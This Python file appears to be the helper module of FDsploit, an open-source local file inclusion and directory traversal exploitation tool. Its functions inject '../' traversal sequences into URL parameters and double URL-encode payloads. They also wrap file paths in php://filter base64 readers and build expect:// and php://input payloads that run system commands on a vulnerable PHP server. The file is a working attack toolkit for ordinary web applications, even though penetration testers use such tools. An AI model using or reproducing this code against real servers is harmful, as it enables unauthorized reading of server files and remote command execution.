#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__      = 'Christophoros Petrou (game0ver)'
__description__ = 'FDsploit.py: File inclusion & directory traversal fuzzer/enumeration & exploitation framework'
__version__     = '1.2'

import os
import re
import sys
import importlib
importlib.reload(sys)
import time
import warnings
import requests
from hashlib import *
from core.colors import *
from subprocess import call
from requests import request
from bs4 import BeautifulSoup
from urllib.parse import quote
from urllib.parse import urlparse
warnings.filterwarnings("ignore")
from fake_useragent import UserAgent


USER_AGENT = 'FDsploit_{}_agent'.format(__version__)


def ret(t):
    sys.stdout.write("\033[F")
    sys.stdout.write("\033[K")
    time.sleep(t)


class Url(object):
    """docstring for Url"""
    def __init__(self, url):
        super(Url, self).__init__()
        self.url = url

    def process(self, qry):
        """process query"""
        varlist = qry.split('&')
        return [var.split('=', 1)[0] for var in varlist]

    def detect(self):
        """detects & returns url-parameters"""
        parsed = urlparse(self.url)
        if parsed.query:
            params = self.process(parsed.query)
            return params if params else None
        else:
            return None

    def wildcardParams(self):
        """detect wildcard parameters if exist..."""
        return re.findall(re.compile(r'[?|&]([^?&]*)=\*'), self.url)


def wildcardPostParams(params):
    """detect wildcard parameters (dictionary) if exist..."""
    if params:
        return [k for k,v in params.items() if v == '*']
    else:
        return None


def req(verb, url, cookie, proxy, params=None, raw_data=None):
    """custom GET/POST request"""
    try:
        headers={'User-Agent':USER_AGENT, 'Cookie': cookie} if cookie else {'User-Agent':USER_AGENT}
        if proxy:
            proxies = {"http":'{}:{}'.format(HOST,int(PORT)),
                       "https":'{}:{}'.format(HOST,int(PORT))}
        if verb == "GET":
            if raw_data: # check for SPECIAL CASE (where instead of GET we have to use POST) used for: php://input (data == raw string)
                if proxy:
                    return request('POST', url, headers=headers, proxies=proxies, data=raw_data, verify=False)
                else:
                    return request('POST', url, headers=headers, data=raw_data, verify=False)
            else:
                if proxy:
                    return request(verb, url, headers=headers, proxies=proxies, verify=False)
                else:
                    return request(verb, url, headers=headers, verify=False)

        if verb == "POST":
            if proxy:
                return request('POST', url, headers=headers, proxies=proxies, data=params, verify=False)
            else:
                return request('POST', url, headers=headers, data=params, verify=False)
    except requests.exceptions.ProxyError:
        print('{}[x] A proxy error occured!{}\n'.format(FR, S))
        sys.exit(0)
    except requests.exceptions.TooManyRedirects:
        print('{}[x] Too many redirects!{}\n'.format(FR, S))
        sys.exit(0)
    except requests.exceptions.Timeout:
        print('{}[x] The request timed out!{}\n'.format(FR, S))
        sys.exit(0)
    except requests.exceptions.SSLError:
        print('{}[x] An SSL error occured!{}\n'.format(FR, S))
        sys.exit(0)
    except requests.exceptions.ConnectionError:
        print('{}[x] A connection error occured!{}\n'.format(FR, S))
        sys.exit(0)


def genUA():
    """returns a fake random user-agent"""
    return str(UserAgent().random)


def lessHTML(content):
    """returns text-only from webpage"""
    soup = BeautifulSoup(content, 'html.parser')
    for item in soup(["script", "style"]):
        item.extract()
    return '\n'.join(line.strip() for line in soup.get_text().splitlines() if line)


def urlEncode(payload, times=1):
    """(2ble)-urlencodes the payload provided"""
    try:
        if times == 2:
            return quote(quote(payload))
        else:
            return quote(payload)
    except Exception as error:
        print('{}[x] Error:{} "{}"'.format(FR,S,error))
        sys.exit(0)


def inject(url, param, payload):
    ptrn = r'(?<={}=).*?([^?&]*)'.format(param)
    match = re.compile(ptrn).search(url).group(0)
    if match != '':
        return url.replace(match, payload)
    else:
        print("[x] Parameters must be in the form: param=VALUE")
        sys.exit(0)


def createQuery(b64, uencoding, tchar, counter, payload):
    """crafts the query based on args/options"""
    if payload.startswith('/'):
        payload = payload[1:]
    pld = counter * '../' + payload if counter else '/{}'.format(payload)
    query = php_b64(pld) if b64 else pld
    if tchar:
        query += tchar
    if uencoding:
        query = urlEncode(query, uencoding)
    return query


def hashpage(content):
    """computes page-content's sha256-hash"""
    if type(content) is str:
        return sha256(content.encode('utf-8')).hexdigest().lower()

    return sha256(content).hexdigest().lower()


def getLen(resp):
    """get length of the response"""
    return len(str(resp))


def extracturls(file):
    """extract urls - avoid duplicates!"""
    with open(file, 'r') as f:
        content = f.read()
    urlptrn = re.compile(r"(http|https)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:\/~+#-*]*[\w@?^=%&\/~+#-*])?")
    matches = re.finditer(urlptrn, content)
    return list(set([url.group() for url in matches]))

def clear_screen():
    call('clear')


# PHP-related functions
def php_b64(payload):
    """use PHP's base64 wrapper"""
    return 'php://filter/read=convert.base64-encode/resource={}'.format(payload)


def php_expect(command):
    """use PHP's expect wrapper to check for command execution"""
    return 'expect://{}'.format(command)


# for command exectution php://input --> POST request required
def php_input(command):
    """use PHP's php://input wrapper to check for command execution"""
    return "<? system('{}'); ?>".format(command)
